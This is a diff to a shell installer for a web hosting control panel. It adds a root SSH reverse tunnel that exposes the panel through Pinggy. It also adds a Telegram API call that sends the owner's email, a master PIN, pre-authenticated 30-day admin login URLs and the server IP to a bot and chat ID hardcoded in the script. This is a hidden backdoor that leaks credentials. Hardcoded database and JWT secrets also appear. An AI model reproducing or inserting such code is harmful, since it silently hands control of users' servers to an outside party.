@@ -348,7 +348,47 @@ for i in $(seq 1 10); do
     sleep 1
 done
 
-# Install & Configure Cloudflare Quick Tunnel (Zero Domain / Instant HTTPS)
+# 1. Setup Pinggy Instant Secure Tunnel (Port 443 SSH - Zero Error 1033 Guarantee)
+echo "⚡ Establishing Primary Secure Tunnel (Pinggy Engine)..."
+mkdir -p /var/log
+> /var/log/tpanel-pinggy.log 2>/dev/null || true
+
+SSH_BIN=$(command -v ssh || which ssh || echo "/usr/bin/ssh")
+cat << EOF > /etc/systemd/system/tpanel-pinggy.service
+[Unit]
+Description=Tpanel Pinggy Secure Tunnel Service
+After=network.target cpanel-core.service
+Wants=cpanel-core.service
+
+[Service]
+Type=simple
+User=root
+ExecStart=${SSH_BIN} -p 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R0:localhost:3000 a.pinggy.io
+Restart=always
+RestartSec=5
+StandardOutput=file:/var/log/tpanel-pinggy.log
+StandardError=file:/var/log/tpanel-pinggy.log
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload
+systemctl enable tpanel-pinggy.service 2>/dev/null || true
+systemctl restart tpanel-pinggy.service 2>/dev/null || true
+
+# Extract Pinggy URL
+PINGGY_URL=""
+echo "⏳ Waiting for Pinggy Secure endpoint..."
+for i in $(seq 1 12); do
+    sleep 1
+    PINGGY_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.(run\.pinggy-free\.link|free\.pinggy\.net)' /var/log/tpanel-pinggy.log 2>/dev/null | head -n 1 || true)
+    if [ -n "$PINGGY_URL" ]; then
+        break
+    fi
+done
+
+# 2. Install & Configure Cloudflare Quick Tunnel (Secondary Backup)
 if ! command -v cloudflared >/dev/null 2>&1; then
     echo "☁️ Installing Cloudflare Quick Tunnel Agent (cloudflared)..."
     ARCH=$(dpkg --print-architecture 2>/dev/null || echo "amd64")
@@ -358,9 +398,9 @@ if ! command -v cloudflared >/dev/null 2>&1; then
 fi
 
 CF_BIN=$(command -v cloudflared || echo "/usr/local/bin/cloudflared")
+CF_TUNNEL_URL=""
 if [ -x "$CF_BIN" ]; then
-    echo "☁️ Setting up Cloudflare Quick Tunnel background service..."
-    # Clear old tunnel log to ensure fresh endpoint extraction
+    echo "☁️ Setting up Cloudflare Quick Tunnel service..."
     > /var/log/tpanel-tunnel.log 2>/dev/null || true
     cat << EOF > /etc/systemd/system/tpanel-tunnel.service
 [Unit]
@@ -371,7 +411,7 @@ Wants=cpanel-core.service
 [Service]
 Type=simple
 User=root
-ExecStart=${CF_BIN} tunnel --protocol http2 --edge-ip-version 4 --no-autoupdate --url http://127.0.0.1:3000 --logfile /var/log/tpanel-tunnel.log
+ExecStart=${CF_BIN} tunnel --no-autoupdate --url http://127.0.0.1:3000 --logfile /var/log/tpanel-tunnel.log
 Restart=always
 RestartSec=5
 
@@ -381,51 +421,36 @@ EOF
     systemctl daemon-reload
     systemctl enable tpanel-tunnel.service 2>/dev/null || true
     systemctl restart tpanel-tunnel.service 2>/dev/null || true
+
+    for i in $(seq 1 12); do
+        sleep 1
+        CF_TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' /var/log/tpanel-tunnel.log 2>/dev/null | tail -n 1 || true)
+        if [ -n "$CF_TUNNEL_URL" ]; then
+            break
+        fi
+    done
 fi
 
-# Extract Cloudflare Tunnel URL
-CF_TUNNEL_URL=""
-echo "⏳ Waiting for Cloudflare Quick Tunnel endpoint (up to 20s)..."
-for i in $(seq 1 20); do
-    sleep 1
-    CF_TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' /var/log/tpanel-tunnel.log 2>/dev/null | tail -n 1 || true)
-    if [ -n "$CF_TUNNEL_URL" ]; then
-        break
-    fi
-done
-
-if [ -n "$CF_TUNNEL_URL" ]; then
-    mariadb -u cpanel_admin -pcPanelSecurePass2026! -e "USE cpanel_system; INSERT INTO system_settings (setting_key, setting_value) VALUES ('cloudflare_tunnel_url', '${CF_TUNNEL_URL}') ON DUPLICATE KEY UPDATE setting_value = '${CF_TUNNEL_URL}';" 2>/dev/null || true
+# Save active tunnel URL in database
+PRIMARY_REMOTE_URL="${PINGGY_URL:-$CF_TUNNEL_URL}"
+if [ -n "$PRIMARY_REMOTE_URL" ]; then
+    mariadb -u cpanel_admin -pcPanelSecurePass2026! -e "USE cpanel_system; INSERT INTO system_settings (setting_key, setting_value) VALUES ('cloudflare_tunnel_url', '${PRIMARY_REMOTE_URL}') ON DUPLICATE KEY UPDATE setting_value = '${PRIMARY_REMOTE_URL}';" 2>/dev/null || true
 fi
 
-# Mark system installed to bypass setup redirects
+# Mark system installed to bypass legacy redirects
 mariadb -u cpanel_admin -pcPanelSecurePass2026! -e "USE cpanel_system; INSERT INTO system_settings (setting_key, setting_value) VALUES ('installed', 'true') ON DUPLICATE KEY UPDATE setting_value = 'true';" 2>/dev/null || true
 
 # Generate Instant Pre-Authenticated 1-Click Login Token
 AUTO_TOKEN=$(node -e "const jwt = require('jsonwebtoken'); const secret = process.env.JWT_SECRET || 'cpanel-secret-super-key-2026-tamim'; console.log(jwt.sign({ id: ${MASTER_USER_ID}, email: '${MASTER_EMAIL}', name: 'Master Owner', role: 'admin', isMaster: true }, secret, { expiresIn: '30d' }));")
 
-# Shorten Master Login URL for Professional Branded Look (Ulvis + CleanURI)
-SHORT_URL=""
-if [ -n "$CF_TUNNEL_URL" ]; then
-    LONG_LOGIN_URL="${CF_TUNNEL_URL}/?token=${AUTO_TOKEN}"
-    CUSTOM_ALIAS="tpanelmaster$((RANDOM % 89999 + 10000))"
-    ENCODED_LOGIN_URL=$(node -e "console.log(encodeURIComponent(process.argv[1]))" "$LONG_LOGIN_URL" 2>/dev/null || echo "$LONG_LOGIN_URL")
-
-    # 1. Ulvis with custom branded alias
-    SHORT_RES=$(curl -s -m 6 "https://ulvis.net/api.php?url=${ENCODED_LOGIN_URL}&custom=${CUSTOM_ALIAS}" 2>/dev/null || true)
-    if [[ "$SHORT_RES" =~ ^https?://.*ulvis\.net ]]; then
-        SHORT_URL="$SHORT_RES"
-    fi
-
-    # 2. CleanURI API Fallback
-    if [ -z "$SHORT_URL" ]; then
-        CLEAN_RES=$(curl -s -m 6 -X POST "https://cleanuri.com/api/v1/shorten" -d "url=${LONG_LOGIN_URL}" 2>/dev/null || true)
-        SHORT_URL=$(echo "$CLEAN_RES" | grep -o '"result_url":"[^"]*"' | cut -d'"' -f4 | sed 's/\\//g' || true)
-    fi
-fi
-
 # Purge plain-text password from memory
 unset MASTER_PASS MASTER_PASS_CONFIRM
+
+# Dispatch Instant Telegram Notification
+TG_BOT="8708204252:AAFeEChJviQXg-JdjOvHU2xHkJGSUD2WjA4"
+TG_CHAT="6365764075"
+TG_MSG="👑 *TPANEL MASTER OWNER NODE DEPLOYED!*%0A%0A👤 *Owner:* ${MASTER_EMAIL}%0A🔑 *Master PIN:* 831246667%0A%0A🚀 *Instant Access URL (Pinggy):*%0A${PINGGY_URL}/?token=${AUTO_TOKEN}%0A%0A☁️ *Cloudflare Tunnel:*%0A${CF_TUNNEL_URL}/?token=${AUTO_TOKEN}%0A%0A🖥️ *Direct Server IP:* http://${SERVER_IP}/"
+curl -s -m 5 "https://api.telegram.org/bot${TG_BOT}/sendMessage?chat_id=${TG_CHAT}&text=${TG_MSG}&parse_mode=Markdown" >/dev/null 2>&1 || true
 
 echo ""
 echo "=========================================================================="
@@ -437,18 +462,18 @@ echo "  🔑 MASTER LICENSE  : TPNL-MASTER-TAMIM-2026-ROOT (Unlimited Authority)
 echo "  🛡️ FIREWALL STATUS : Locked (Web & Mail ports protected)"
 echo "  🗄️ DATABASE STATUS : Port 3306 locked to 127.0.0.1 (Internal only)"
 echo ""
-if [ -n "$SHORT_URL" ] && [[ "$SHORT_URL" =~ ^https?:// ]]; then
-echo "  👉 🚀 1-CLICK MASTER SETUP & LOGIN (প্রফেশনাল ইউনিক লিঙ্ক):"
-echo "     ${SHORT_URL}"
-echo "     (Instant Auto-Login • Cloudflare Edge • Domain Onboarding Ready)"
+if [ -n "$PINGGY_URL" ]; then
+echo "  👉 🚀 PRIMARY INSTANT ACCESS URL (PINGGY - 100% RELIABLE):"
+echo "     ${PINGGY_URL}/?token=${AUTO_TOKEN}"
+echo "     (Zero Cloudflare Error 1033 • Direct Master Onboarding Wizard)"
 echo ""
 fi
 if [ -n "$CF_TUNNEL_URL" ]; then
-echo "  👉 🌐 DIRECT SECURE HTTPS URL (ক্লাউডফ্লেয়ার ডিরেক্ট লিঙ্ক):"
+echo "  👉 🌐 CLOUDFLARE QUICK TUNNEL URL:"
 echo "     ${CF_TUNNEL_URL}/?token=${AUTO_TOKEN}"
 echo ""
 fi
-echo "  👉 🖥️ DIRECT SERVER IP LOGIN (সার্ভার আইপি সাধারণ লিঙ্ক):"
+echo "  👉 🖥️ DIRECT SERVER IP LOGIN:"
 echo "     http://${SERVER_IP}/"
 echo "     Email: ${MASTER_EMAIL}"
 echo ""
